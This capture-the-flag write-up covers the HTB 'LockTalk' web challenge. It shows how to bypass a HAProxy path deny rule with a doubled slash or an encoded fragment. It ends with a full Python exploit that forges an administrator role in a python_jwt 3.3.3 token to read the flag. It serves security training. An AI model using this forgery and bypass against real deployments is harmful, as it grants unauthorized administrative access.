## **Description**
In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.
<br></br>
In `config.py`, we can see that the token was generated usingRSA,A so we can't bruteforce the token.

```py
JWT_SECRET_KEY = jwk.JWK.generate(kty='RSA', size=2048)
```
In `requirements.txt`, we can see that it's using an old version of JWT, `python_jwt==3.3.3`, which is vulnerable. According to this: `https://github.com/advisories/GHSA-5p8v-58qm-c7fp`

<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/HTB_cyber_apocalypse/WEB/images/4.PNG">
<br></br>
Let's open the site now. 
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/HTB_cyber_apocalypse/WEB/images/5.PNG">
<br></br>
If we tried to generate a token using `/api/v1/get_ticket` it will return `403` because of the configurations in ``haproxy.cfg``

```http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }```

We can bypass this if we add another `/`  to make it like this `//api/v1/get_ticket`
or based on this : `https://www.cvedetails.com/cve/CVE-2023-45539/`

we can just add a fragment # (encoded) `/api/v1/get_ticket#`

Both will work. After getting the JWT, we can see that we have a role `guest` Let's forge it to `Administrator`
<br></br>
<img src="https://github.com/Yazan03/CTF-Writeups2024/blob/main/HTB_cyber_apocalypse/WEB/images/6.PNG">
<br></br>
Exploit: 
```py
from requests import *
import re
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode
import argparse
r=get("http://83.136.254.223:41786//api/v1/get_ticket")
js=r.json()

ticket_value = js.get('ticket: ', None)

token=ticket_value
claim="role=administrator"

# Split JWT in its ingredients
[header, payload, signature] = token.split(".")


# Payload is relevant
parsed_payload = loads(base64url_decode(payload))
print(f"[+] Decoded payload: {parsed_payload}")

# Processing of the user input and inject new claims
try:
    claims = claim.split(",")
    for c in claims:
        key, value = c.split("=")
        parsed_payload[key.strip()] = value.strip()
except:
    print("[-] Given claims are not in a valid format")
    exit(1)

# merging. Generate a new payload

fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))


# Create a new JWT Web Token
new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
print(new_payload)

url="http://83.136.254.223:41786/api/v1/flag"
r=get(url,headers={"Authorization":new_payload})
print(r.text)
#{"message":"HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}"}
```
